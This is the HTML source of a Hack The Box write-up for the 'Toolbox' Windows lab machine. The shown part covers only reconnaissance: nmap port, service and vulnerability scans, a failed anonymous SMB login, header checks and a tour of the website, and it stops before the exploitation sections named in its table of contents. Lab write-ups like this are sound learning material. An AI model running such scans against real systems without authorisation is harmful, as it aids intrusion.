@@ -1,0 +1,1280 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="author" content="Matthieu Mezirard" />
+    
+        <meta description="This is an easy Windows box.">
+    
+    <title>
+        
+            Toolbox | mmezirard
+        
+    </title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+    <link
+        id="theme-light-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/light.css"
+    />
+    <link
+        id="theme-dark-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/dark.css"
+    />
+    <script
+        async
+        src="https://eu.umami.is/script.js"
+        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
+    ></script>
+    <script src="/js/theme-toggle.js"></script>
+    <script src="/js/code-wrapper.js"></script>
+    <script src="/js/code-indicator.js"></script>
+</head>
+
+
+    <body>
+        <header>
+    <div class="left">
+        <a href="/">
+    mmezirard
+</a>
+
+        <div class="socials">
+    
+        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/github.svg" alt="github" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
+            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/hackerone.svg" alt="hackerone" />
+        </a>
+    
+</div>
+
+    </div>
+    <div class="right">
+        <nav>
+    <ul>
+        
+            <li>
+                <a href="&#x2F;htb-write-ups">
+                    &#x2F;htb-write-ups
+                </a>
+            </li>
+        
+    </ul>
+</nav>
+
+        <button onclick="toggleTheme()">
+    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
+    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
+</button>
+<script src="/js/theme-toggle.js"></script>
+
+    </div>
+</header>
+
+        
+    <main>
+        
+<article>
+    <div>
+        
+    
+        <div class="page-h1">
+            Toolbox<span>.</span>
+        </div>
+    
+
+
+        <div class="page-metadata">
+            
+                Posted on <time>2023-12-27</time>
+            
+        </div>
+
+        
+            <img
+                class="page-cover"
+                alt="cover.png"
+                src="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/cover.png"
+            />
+        
+    </div>
+
+    
+        <h1>Table of Contents</h1>
+        <ul>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#information">Information</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#setup">Setup</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#remote-enumeration">Remote enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#host-discovery">Host discovery</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#tcp-port-scanning">TCP port scanning</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#service-fingerprinting">Service fingerprinting</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#scripts">Scripts</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#ftp-port-21-tcp">FTP (port 21&#x2F;tcp)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#known-cves">Known CVEs</a>
+                                            </li>
+                                        
+                                    </ul>
+                            
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#smb-port-445-tcp">SMB (port 445&#x2F;tcp)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#anonymous-login">Anonymous login</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#common-credentials">Common credentials</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#known-cves-1">Known CVEs</a>
+                                            </li>
+                                        
+                                    </ul>
+                            
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#apache-port-443-tcp">Apache (port 443&#x2F;tcp)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#http-headers">HTTP headers</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#technology-lookup">Technology lookup</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#exploration">Exploration</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#site-crawling">Site crawling</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#directory-fuzzing">Directory fuzzing</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#admin-megalogistic-com-subdomain">admin.megalogistic.com subdomain</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#common-credentials-1">Common credentials</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#sqli">SQLi</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#exploration-1">Exploration</a>
+                                            </li>
+                                        
+                                    </ul>
+                            
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#postgresql-through-apache">PostgreSQL (through Apache)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#version">Version</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#databases">Databases</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#public-s-tables">public&#x27;s tables</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#users-s-columns">users&#x27;s columns</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#users-s-columns-content">users&#x27;s columns content</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#hash-cracking">Hash cracking</a>
+                                            </li>
+                                        
+                                    </ul>
+                            
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#foothold-sqli">Foothold (SQLi)</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#preparation">Preparation</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#exploitation">Exploitation</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#local-enumeration">Local enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#distribution">Distribution</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#architecture">Architecture</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#kernel">Kernel</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#nics">NICs</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#home-folder">Home folder</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#pivoting-ssh">Pivoting (SSH)</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#local-enumeration-1">Local enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#distribution-1">Distribution</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#architecture-1">Architecture</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#kernel-1">Kernel</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#apparmor">AppArmor</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#nics-1">NICs</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#hostname">Hostname</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#local-users">Local users</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#local-groups">Local groups</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#user-account-information">User account information</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#home-folder-1">Home folder</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#command-history">Command history</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#sudo-permissions">Sudo permissions</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#privilege-escalation-sudo-permissions">Privilege escalation (Sudo permissions)</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#preparation-1">Preparation</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#exploitation-1">Exploitation</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#local-enumeration-2">Local enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#home-folder-2">Home folder</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#c-folder">&#x2F;c folder</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#pivoting-ssh-1">Pivoting (SSH)</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#check">Check</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#exploitation-2">Exploitation</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#local-enumeration-3">Local enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#home-folder-3">Home folder</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#afterwords">Afterwords</a>
+                    
+                </li>
+            
+        </ul>
+    
+
+    <section><h1 id="information">Information</h1>
+<p><strong>Difficulty</strong>: Easy</p>
+<p><strong>OS</strong>: Windows</p>
+<p><strong>Release date</strong>: 2021-03-12</p>
+<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/8308">MinatoTW</a></p>
+<h1 id="setup">Setup</h1>
+<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great practice security-wise, but it's a VM so it's alright. This way I won't have to prefix some commands with <code>sudo</code>, which gets cumbersome in the long run. Heck, it's hard enough to remember the flags for the commands without needing to know the privileges required to run them too!</p>
+<p>I like to maintain consistency in my workflow for every box, so before starting with the actual pentest, I'll prepare a few things:</p>
+<ol>
+<li>
+<p>I'll create a directory that will contain every file related to this box. I'll call it <code>workspace</code>, and it will be located at the root of my filesystem <code>/</code>.</p>
+</li>
+<li>
+<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll run <code>httpsimpleserver</code> to create an HTTP server and <code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make files in this folder available over the Internet, which will be especially useful for transferring files to the target machine if need be!</p>
+</li>
+<li>
+<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory. This will come in handy once we get a foothold, for privilege escalation and for pivoting inside the internal network.</p>
+</li>
+</ol>
+<p>I'll also strive to minimize the use of Metasploit, because it hides the complexity of some exploits, and prefer a more manual approach when it's not too much hassle to really understand what's happening on the machine.</p>
+<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.6</code>, while the target machine's IP address will be <code>10.10.10.236</code>. The commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever need to transfer files or binaries to the target machine I'll always place them in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
+<p>Now we should be ready to go!</p>
+<h1 id="remote-enumeration">Remote enumeration</h1>
+<h2 id="host-discovery">Host discovery</h2>
+<p>Well, we already know the IP we are targeting, so this phase is actually empty!</p>
+<h2 id="tcp-port-scanning">TCP port scanning</h2>
+<p>As usual, I'll initiate a port scan on Toolbox using a TCP SYN <code>nmap</code> scan to assess its attack surface.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.10.236<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT      STATE SERVICE
+</span><span class="z-text z-plain">21/tcp    open  ftp
+</span><span class="z-text z-plain">22/tcp    open  ssh
+</span><span class="z-text z-plain">135/tcp   open  msrpc
+</span><span class="z-text z-plain">139/tcp   open  netbios-ssn
+</span><span class="z-text z-plain">443/tcp   open  https
+</span><span class="z-text z-plain">445/tcp   open  microsoft-ds
+</span><span class="z-text z-plain">5985/tcp  open  wsman
+</span><span class="z-text z-plain">47001/tcp open  winrm
+</span><span class="z-text z-plain">49664/tcp open  unknown
+</span><span class="z-text z-plain">49665/tcp open  unknown
+</span><span class="z-text z-plain">49666/tcp open  unknown
+</span><span class="z-text z-plain">49667/tcp open  unknown
+</span><span class="z-text z-plain">49668/tcp open  unknown
+</span><span class="z-text z-plain">49669/tcp open  unknown
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h2 id="service-fingerprinting">Service fingerprinting</h2>
+<p>Following the port scan, let's gather more data about the services associated with the open ports we found.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.10.236<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> 21,22,135,139,443,445,5985<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT     STATE SERVICE       VERSION
+</span><span class="z-text z-plain">21/tcp   open  ftp           FileZilla ftpd
+</span><span class="z-text z-plain">22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
+</span><span class="z-text z-plain">135/tcp  open  msrpc         Microsoft Windows RPC
+</span><span class="z-text z-plain">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span><span class="z-text z-plain">443/tcp  open  ssl/http      Apache httpd 2.4.38 ((Debian))
+</span><span class="z-text z-plain">445/tcp  open  microsoft-ds?
+</span><span class="z-text z-plain">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span><span class="z-text z-plain">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Alright, so <code>nmap</code> managed to determine that Toolbox is running Windows. That's good to know!</p>
+<h2 id="scripts">Scripts</h2>
+<p>Let's run <code>nmap</code>'s default scripts on these services to see if they can find additional information.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.10.236<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> 21,22,135,139,443,445,5985<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT     STATE SERVICE
+</span><span class="z-text z-plain">21/tcp   open  ftp
+</span><span class="z-text z-plain">| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+</span><span class="z-text z-plain">|_-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
+</span><span class="z-text z-plain">| ftp-syst: 
+</span><span class="z-text z-plain">|_  SYST: UNIX emulated by FileZilla
+</span><span class="z-text z-plain">22/tcp   open  ssh
+</span><span class="z-text z-plain">| ssh-hostkey: 
+</span><span class="z-text z-plain">|   2048 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f (RSA)
+</span><span class="z-text z-plain">|   256 a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd (ECDSA)
+</span><span class="z-text z-plain">|_  256 ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 (ED25519)
+</span><span class="z-text z-plain">135/tcp  open  msrpc
+</span><span class="z-text z-plain">139/tcp  open  netbios-ssn
+</span><span class="z-text z-plain">443/tcp  open  https
+</span><span class="z-text z-plain">|_http-title: MegaLogistics
+</span><span class="z-text z-plain">| ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR
+</span><span class="z-text z-plain">| Not valid before: 2020-02-18T17:45:56
+</span><span class="z-text z-plain">|_Not valid after:  2021-02-17T17:45:56
+</span><span class="z-text z-plain">|_ssl-date: TLS randomness does not represent time
+</span><span class="z-text z-plain">| tls-alpn: 
+</span><span class="z-text z-plain">|_  http/1.1
+</span><span class="z-text z-plain">445/tcp  open  microsoft-ds
+</span><span class="z-text z-plain">5985/tcp open  wsman
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Host script results:
+</span><span class="z-text z-plain">| smb2-time: 
+</span><span class="z-text z-plain">|   date: 2023-12-26T12:19:07
+</span><span class="z-text z-plain">|_  start_date: N/A
+</span><span class="z-text z-plain">| smb2-security-mode: 
+</span><span class="z-text z-plain">|   3:1:1: 
+</span><span class="z-text z-plain">|_    Message signing enabled but not required
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Okay, so <code>nmap</code>'s scans found that the FTP server allows anonymous connections, and contains a <code>docker-toolbox.exe</code> file. Let's search online for more information on this application:</p>
+<blockquote>
+<p>The Docker Toolbox installs everything you need to get started with Docker on Mac OS X and Windows. It includes the Docker client, Compose, Machine, Kitematic, and VirtualBox.</p>
+<p>— <a href="https://github.com/docker-archive/toolbox">GitHub</a></p>
+</blockquote>
+<p>Basically, this is a software used to simplify the use of Docker on Windows and Mac, since it's harder to do so on these OS than on Linux. It creates a VM that hosts the Docker containers.</p>
+<p>The presence of this file is a hint that the Apache web server is running inside a Docker container in a VM, that's why it uses a Debian version of Apache.</p>
+<p><code>nmap</code>'s scans also found that the SSL certificate issuer of the web server on port <code>443/tcp</code> is set to the subdomain <code>admin.megalogistic.com</code>.</p>
+<p>Let's add this subdomain and the corresponding domain to our hosts file.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> echo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.236 megalogistic.com admin.megalogistic.com<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">tee</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>a</span> /etc/hosts</span>
+</span></code></pre>
+<p>Let's explore the FTP and SMB servers first!</p>
+<h2 id="ftp-port-21-tcp">FTP (port <code>21/tcp</code>)</h2>
+<p>Usually I would start with the exploration FTP server, but we already know that we can connect anonymously and that it hosts a <code>docker-toolbox.exe</code> file, so this would be pointless.</p>
+<h3 id="known-cves">Known CVEs</h3>
+<p>Just for good measure, let's check if FTP is vulnerable to known exploits.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.10.236<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> 21<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>script</span> vuln</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">21/tcp open  ftp
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Nothing!</p>
+<h2 id="smb-port-445-tcp">SMB (port <code>445/tcp</code>)</h2>
+<h3 id="anonymous-login">Anonymous login</h3>
+<p>We can try to connect to the SMB server as the <code>NULL</code> user. With a bit of luck, this will work!</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> smbclient<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>L</span> //10.10.10.236<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>N</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">session setup failed: NT_STATUS_ACCESS_DENIED
+</span></code></pre>
+<p>Well, apparently it doesn't.</p>
+<h3 id="common-credentials">Common credentials</h3>
+<p>We can try common credentails too, but to no avail.</p>
+<h3 id="known-cves-1">Known CVEs</h3>
+<p>Let's see if SMB is vulnerable to known CVEs.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.10.236<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> 445<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>script</span> vuln</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT    STATE SERVICE
+</span><span class="z-text z-plain">445/tcp open  microsoft-ds
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Host script results:
+</span><span class="z-text z-plain">|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
+</span><span class="z-text z-plain">|_smb-vuln-ms10-054: false
+</span><span class="z-text z-plain">|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Well, looks like it isn't! Let's move on to the mysterious web server we found on port <code>443/tcp</code> then.</p>
+<h2 id="apache-port-443-tcp">Apache (port <code>443/tcp</code>)</h2>
+<p>Let's browse to <code>https://megalogistic.com/</code>:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/domain-homepage.png" alt="Domain homepage" /></p>
+<p>This looks like a website about <code>MegaLogistics</code>, a company that offers 'worldwide freight services'.</p>
+<h3 id="http-headers">HTTP headers</h3>
+<p>Before exploring it further, let's check the HTTP response headers when we request the homepage.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>k</span> https://megalogistic.com/<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>I</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HTTP/1.1 200 OK
+</span><span class="z-text z-plain">Date: Tue, 26 Dec 2023 12:34:40 GMT
+</span><span class="z-text z-plain">Server: Apache/2.4.38 (Debian)
+</span><span class="z-text z-plain">Last-Modified: Tue, 18 Feb 2020 06:51:26 GMT
+</span><span class="z-text z-plain">ETag: &quot;5755-59ed419c2b780&quot;
+</span><span class="z-text z-plain">Accept-Ranges: bytes
+</span><span class="z-text z-plain">Content-Length: 22357
+</span><span class="z-text z-plain">Vary: Accept-Encoding
+</span><span class="z-text z-plain">Content-Type: text/html
+</span></code></pre>
+<p>The <code>Server</code> header confirms what we already knew thanks to <code>nmap</code>'s default scripts. Unfortunately, there's nothing more to learn.</p>
+<h3 id="technology-lookup">Technology lookup</h3>
+<p>While we're at it, let's look up the technologies used by this website with the <a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/domain-homepage-wappalyzer.png" alt="Domain homepage Wappalyzer extension" /></p>
+<p>So it confirms what we already discovered, but it also reveals that this website is using Bootstrap and libraries like jQuery.</p>
+<h3 id="exploration">Exploration</h3>
+<p>If we browse the website, we see that we have access to several web pages aside from the 'Home' web page.</p>
+<p>The 'About us' page:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/domain-about-us-page.png" alt="Domain 'About us' page" /></p>
+<p>The 'Our services' page:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/domain-our-services-page.png" alt="Domain 'Our services' page" /></p>
+<p>The 'Industries' page:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/domain-industries-page.png" alt="Domain 'Industries' page" /></p>
+<p>The 'Our blog' page:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/domain-our-blog-page.png" alt="Domain 'Our blog' page" /></p>
+<p>And finally, the 'Contact' page:</p>
